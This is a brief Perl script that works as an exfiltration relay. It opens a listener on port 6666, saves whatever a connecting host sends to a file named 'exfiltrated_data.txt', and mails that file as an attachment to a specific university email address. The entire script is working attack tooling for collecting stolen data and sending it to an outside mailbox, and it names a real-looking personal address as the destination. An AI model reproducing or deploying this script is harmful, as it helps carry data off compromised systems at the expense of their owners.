#!/usr/bin/perl

use Modern::Perl;
use IO::All;
use Mail::DWIM qw/mail/;

my $ex_data = '/tmp/exfiltrated_data.txt';

io(':6666')->accept->slurp > io($ex_data);

mail(
        to      => 'darianp@isc.upenn.edu',
        subject => 'Special stuff',
        attach  => [$ex_data],
        text    => 'See attached.',
);

